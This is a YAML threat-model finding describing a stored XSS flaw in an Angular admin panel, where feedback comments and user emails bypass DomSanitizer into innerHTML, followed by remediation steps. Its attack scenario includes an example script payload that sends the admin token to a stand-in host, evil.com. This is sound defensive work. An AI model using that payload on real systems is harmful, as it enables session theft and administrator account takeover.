threats:
- local_id: angular-spa-004
  threat_category_id: TH-11
  additional_categories: []
  stride: Tampering
  cwe: CWE-79
  title: Systemic XSS — administration.component.ts:78
  affected_parameter: feedback.comment / user.email
  scenario: 'administration.component.ts:78 calls `this.sanitizer.bypassSecurityTrustHtml(feedback.comment)` on every feedback
    record fetched from /api/Feedbacks, and line 60 wraps `user.email` in a `<span>` interpolated via the same bypass. Both
    are bound to `[innerHTML]` in administration.component.html (lines 26 and 60 of the template). An unauthenticated attacker
    submits a POST to /api/Feedbacks with `comment: ''<script>fetch("https://evil.com/?"+localStorage.getItem("token"))</script>''`.
    When an admin next opens the /administration panel, the stored script executes in the admin''s browser, exfiltrating the
    admin JWT. No CSP blocks the exfiltration.'
  evidence_summary: administration.component.ts:78 calls `bypassSecurityTrustHtml(feedback.comment)` and line 60 calls `bypassSecurityTrustHtml(...)`
    on user.email, both bound to `[innerHTML]` in the admin panel template.
  impact_description: Stored XSS in the admin panel allows a low-privilege attacker to silently exfiltrate the admin JWT and
    take over the administrator account.
  likelihood: High
  impact: Critical
  risk: Critical
  controls_in_place: None — DomSanitizer bypass is explicit; no CSP; admin panel is protected only by a client-side guard.
  mitigation_title: Remove DomSanitizer bypass in administration component and sanitize user-controlled content before display
  remediation:
    effort: Medium
    steps:
    - Remove `this.sanitizer.bypassSecurityTrustHtml()` calls at administration.component.ts:60 and :78. Render email and
      comment as plain text via Angular interpolation `{{user.email}}` and `{{feedback.comment}}`.
    - 'If the administration UI requires formatted HTML display (e.g., clickable links in feedback), apply DOMPurify with
      a strict allow-list: `DOMPurify.sanitize(feedback.comment, { ALLOWED_TAGS: [''b'', ''i'', ''u'', ''a''], ALLOWED_ATTR:
      [''href''] })`.'
    - Validate and encode feedback.comment server-side before storage so that the XSS payload never reaches the database.
    - Deploy a `Content-Security-Policy` header restricting `script-src` to `'self'` to prevent exfiltration even if an innerHTML
      sink is reached.
    code_example: '// administration.component.ts — before (line 78)

      feedback.comment = this.sanitizer.bypassSecurityTrustHtml(feedback.comment)

      // after

      // no transformation — use plain text binding in template


      // administration.component.html — before (line 60)

      <mat-cell *matCellDef="let feedback" ...><p [innerHTML]="feedback.comment"></p></mat-cell>

      // after

      <mat-cell *matCellDef="let feedback" ...><p>{{feedback.comment}}</p></mat-cell>'
    reference: CWE-79
  evidence:
  - file: frontend/src/app/administration/administration.component.ts
    line: 78
  evidence_check: verified
  controls_absent_evidence: []
